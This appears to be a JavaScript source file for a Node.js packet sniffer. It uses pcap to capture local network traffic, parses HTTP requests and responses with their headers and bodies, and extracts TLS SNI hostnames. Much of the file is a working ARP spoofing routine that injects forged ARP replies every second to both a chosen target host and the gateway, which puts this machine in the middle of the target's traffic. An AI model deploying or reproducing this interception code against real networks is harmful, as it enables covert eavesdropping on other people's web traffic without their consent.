import EventEmitter from 'events'
import pcap from 'pcap'
import pcapFilters from './pcap-filters'
import tlsClientHello from 'is-tls-client-hello'
import sni from 'sni'

class Sniffer extends EventEmitter {

  constructor (logDebug = false) {
    super()
    this.name = 'Sniffer'
    this.sniff = false
    this.debug = logDebug
    this._if = ''
    this.initComplete = false
    this._client = null
    this.arpInterval = null
    this.arpIntervalPeriod = 1000
    this.arpTarget = null
  }

  info (msg) {
    console.log(`[ INFO ] [${this.name}]: ${msg}`)
  }

  debug (msg) {
    if (this.logDebug) {
      console.log(`[ DEBUG ] [${this.name}]: ${msg}`)
    }
  }

  error (msg) {
    console.log(`[ ERROR ] [${this.name}]: ${msg}`)
  }

  set client (socket) {
    this._client = socket
  }

  get client () {
    return this._client
  }

  init (iface) {
    try {
      this.setLocalInterface(iface)
      this.session = pcap.createSession(this._if, pcapFilters.https)
      if (this.session === null) {
        this.emit('error', 'session failed')
      }
      if (this.session) {
        this.session.on('packet', this._cb.bind(this))
        this.initComplete = true
      }
    } catch (err) {
      this.session = null
    }
  }

  cmd (name, ...args) {
    if (name === 'updateTarget') {
      this.updateTarget(...args)
    } else if (name === 'setLocalInterface') {
      this.setLocalInterface(...args)
    }
  }

  start (socket) {
    this.info('Starting Sniffer')
    this.sniff = true
  }

  stop (socket) {
    this.info('Stopping Sniffer')
    this.sniff = false
    this.stopArpSpoof()
  }

  startArpSpoof (params) {
    if (!this.arpInterval) {
      this.arpInterval = setInterval(() => {
        this.arpPack(params.toTarget)
        this.arpPack(params.toRouter)
      }, this.arpIntervalPeriod)
      this.info(`Start arp spoof. target:${params.toRouter.src_ip}`)
      this.arpTarget = params.toRouter.src_ip
    } else {
      this.info(`Spoof already running. clearing current spoof and restarting`)
      this.stopArpSpoof()
      this.startArpSpoof(params)
    }
  }

  stopArpSpoof () {
    if (this.arpInterval) {
      this.info(`Stop arp spoof`)
      clearInterval(this.arpInterval)
      this.arpInterval = null
      this.arpTarget = null
    }
  }

  setLocalInterface (host) {
    this._if = host.interface
    this.local = host.ip
    this.mac = host.mac
    // this.info(`ip: ${ip}`)
    // this.info(`mac: ${mac}`)
  }

  updateTarget (d) {
    if (d.hasOwnProperty('stop') && d.stop) {
      this.stopArpSpoof()
    } else if (d.target_ip === this.local) {
      this.stopArpSpoof()
      this.info('Target is the this computer, not arp spoofing')
    } else {
      let params = {}
      params.toRouter = {
        src_ip: d.target_ip,
        src_mac: d.target_mac,
        self_mac: d.self_mac,
        target_ip: d.gw_ip,
        target_mac: d.gw_mac
      }

      params.toTarget = {
        src_ip: d.gw_ip,
        src_mac: d.gw_mac,
        self_mac: d.self_mac,
        target_ip: d.target_ip,
        target_mac: d.target_mac
      }
      this.startArpSpoof(params)
    }
  }
// src ip  (the IP you're targetting )
// src mac (the MAC you're targetting)
// target ip : gw (the node youre telling)
// target mac: gw (the node youre telling)
// {src_ip: '192.168.1.35',
//     src_mac: '60:03:08:93:6b:ba',
//     target_ip: '192.168.1.1',
//     target_mac: '6c:72:20:6b:89:44'}
  arpPack (config) {
    const pktConfig = {
      'op': 'request',
      'src_ip': config.src_ip,
      'src_mac': config.src_mac,
      'self_mac': config.self_mac,
      'dst_ip': config.target_ip,
      'dst_mac': config.target_mac
    }

    const pkt = {}
    pkt.dst = this.macToArr(pktConfig.dst_mac)
    pkt.src = this.macToArr(pktConfig.self_mac)

    // ARP
    pkt.ether_type = [0x08, 0x06]
    pkt.hw_type = [0x00, 0x01]
    pkt.proto_type = [0x08, 0x00]
    pkt.hw_len = [0x06]
    pkt.proto_len = [0x04]
    pkt.op = [0x00, 0x02]

    pkt.src_mac = this.macToArr(pktConfig.self_mac)
    pkt.src_ip = this.ipToArr(pktConfig.src_ip)
    pkt.dst_mac = this.macToArr(pktConfig.dst_mac)
    pkt.dst_ip = this.ipToArr(pktConfig.dst_ip)

    var x
    var pktArr = []
    for (x in pkt) {
      pktArr = pktArr.concat(pkt[x])
    }

    var arpRequest = new Buffer(pktArr)
    this.session.inject(arpRequest)
  }

  _cb (raw) {
    try {
      const packet = pcap.decode.packet(raw)
      const parsed = this._parse(packet, raw)
      if (parsed && this.sniff) {
        this.emit('newPacket', parsed)
      }
    } catch (err) {
      this.error(err)
    }
  }

  _parse (packet, raw) {
    const ts = packet.pcap_header.tv_sec
    const eth = packet.payload
    const ip = eth.payload
    const tcp = ip.payload
    const src = ip.saddr.addr.join('.')
    const dst = ip.daddr.addr.join('.')

    if (this.arpTarget) {
      if (this.arpTarget !== src && this.arpTarget !== dst) {
        return false
      }
    } else {
      if (this.local !== src && this.local !== dst) {
        return false
      }
    }

    if (tcp.sport === 8443 ||
        tcp.sport === 443 ||
        tcp.dport === 443 ||
        tcp.dport === 8443) {
      if (tcp.data) {
        if (tlsClientHello(tcp.data)) {
          return {ts: ts, eth: eth, ip: ip, tcp: tcp, payload: { type: 'https', host: sni(tcp.data) }}
        }
      }
      return false
    }

    if (!tcp.data) {
      return false
    }

    const r = tcp.data.toString('utf-8')
    if (r.indexOf('Content-Length') === -1 &&
        r.indexOf('Host') === -1 &&
        r.indexOf('Content-Type') === -1) {
      return false
    }

    const httpr = r.split('\r\n')
    try {
      return { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: this.parseHTTP(httpr) }
    } catch (err) {
      this.error(err)
      return false
    }
  }

  macToArr (macAddr) {
    var macArr = macAddr.split(':')
    var x
    for (x in macArr) {
      macArr[x] = '0x' + macArr[x]
    }
    return macArr
  }

  ipToArr (ipAddr) {
    var ipArr = ipAddr.split('.')
    var x
    for (x in ipArr) {
      ipArr[x] = ipArr[x]
    }
    return ipArr
  }

  parseHTTP (headers) {
    const packet = {}
    packet.http = true
    packet.host = ''
    const firstline = headers.shift()
    if (firstline.indexOf('GET') > -1 ||
        firstline.indexOf('POST') > -1 ||
        firstline.indexOf('PUT') > -1) {
      const [verb, url, version] = firstline.split(' ')
      packet.type = 'request'
      packet.method = verb
      packet.url = url
      packet.version = version
    } else {
      const [version, code, status] = firstline.split(' ')
      packet.type = 'response '
      packet.code = code
      packet.status = status
      packet.version = version
    }

    packet.headers = []

    for (var i = 0; i < headers.length; i++) {
      if (headers[i] === '') {
        break
      }

      const header = headers[i].split(': ')
      if (header.length < 2) {
        continue
      } else {
        if (header[0].indexOf('Host') > -1) {
          packet.host = header[1]
        }
        packet.headers.push([header[0], header[1]])
      }
    }

    const lastline = headers.pop()
    packet.payload = lastline
    return packet
  }
}

export default new Sniffer()
